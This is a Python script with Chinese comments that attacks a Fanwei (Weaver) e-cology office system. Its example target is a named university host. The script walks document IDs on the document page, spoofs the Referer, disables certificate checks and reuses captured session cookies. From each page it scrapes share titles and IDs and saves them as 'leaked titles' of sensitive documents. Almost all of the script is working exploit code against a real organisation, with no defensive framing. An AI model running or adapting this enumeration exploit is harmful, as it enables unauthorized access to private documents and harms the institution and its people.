# fanwei_hhstu_onekey.py   ← 保存这个名字
import requests, re, json, time, sys, html
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ========= 只需改这部分cookies（固定配置） =========
cookies = {
    "Hm_lvt_7cbc6cb2d4370f7e8f1eb7dd0b7329c3": "1761662429,1761826784",  # 你的cookies
    "ecology_JSessionid": "aaaSsWXm_uPrsgPFedMNz",  # 每次刷新都要换
    "JSESSIONID": "aaaSsWXm_uPrsgPFedMNz",  # 同上
    "__randcode__": "4910666c-de18-427f-b060-79f069e381c4"  # 每次刷新都要换
}
referer_id = 2  # 伪造的来源页面id，随便填一个存在的就行
# ===================================================

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Referer": "",  # 后续动态拼接
    "Connection": "close"
}


def get_title(uid, base_url):
    url = f"{base_url}/spa/document/index.jsp"
    params = {"id": uid, "router": "2"}
    # 动态更新Referer（适配传入的base_url）
    headers["Referer"] = f"{base_url}/spa/document/index.jsp?id={referer_id}"

    try:
        r = requests.get(
            url,
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=15,
            verify=False,
            allow_redirects=False
        )
        r.encoding = 'utf-8'

        # 精准匹配目标JSON
        match = re.search(
            r"function onDocShare\(\)\s*\{\s*var\s+message\s*=\s*'([\s\S]*?)';\s*socialshareToEmessage\(message\);\s*\}",
            r.text
        )
        if not match:
            print(f"ID={uid} 无数据")
            return None

        json_str = match.group(1).strip()
        json_str = html.unescape(json_str)
        data = json.loads(json_str)
        title = str(data[0]["sharetitle"]).strip().replace('\r\n', '').replace('\t', '')
        sid = str(data[0]["shareid"]).strip()

        print(f"\033[91m[命中] ID={uid} | {title} | shareid={sid}\033[0m")
        return f"ID={uid} | {title} | shareid={sid}"

    except json.JSONDecodeError as e:
        print(f"ID={uid} JSON解析失败：{str(e)[:30]}")
    except IndexError:
        print(f"ID={uid} 未找到sharetitle字段")
    except Exception as e:
        print(f"ID={uid} 报错：{str(e)[:50]}")

    print(f"ID={uid} 无数据")
    return None


if __name__ == "__main__":
    # 命令行参数校验（格式：python 脚本名.py base_url start_id end_id）
    if len(sys.argv) != 4:
        print("\033[31m参数错误！正确格式：python fanwei_hhstu_onekey.py 目标URL 起始ID 结束ID\033[0m")
        print("示例：python fanwei_hhstu_onekey.py https://office.hhstu.edu.cn 1 30")
        sys.exit(1)

    # 提取命令行参数
    base = sys.argv[1].strip().rstrip('/')  # 去除URL末尾的/，避免拼接错误
    try:
        start = int(sys.argv[2])
        end = int(sys.argv[3])
    except ValueError:
        print("\033[31m起始ID和结束ID必须是整数！\033[0m")
        sys.exit(1)

    # 校验ID范围合理性
    if start > end or start < 1:
        print("\033[31mID范围错误！起始ID必须小于结束ID，且大于等于1\033[0m")
        sys.exit(1)

    results = []
    print(f"开始扫描 | 目标URL：{base} | ID范围：{start}-{end}（共{end - start + 1}个）")
    for i in range(start, end + 1):
        res = get_title(i, base)
        if res:
            results.append(res)
        time.sleep(0.8)

    # 保存结果（文件名包含目标URL标识，避免覆盖）
    filename = f"{base.split('//')[-1].replace('.', '_').replace('/', '_')}_泄露标题.txt"
    with open(filename, "w", encoding="utf-8-sig") as f:
        f.write("\n".join(results))
    print(f"\n完成！共发现 {len(results)} 条敏感文档，已保存到 {filename}")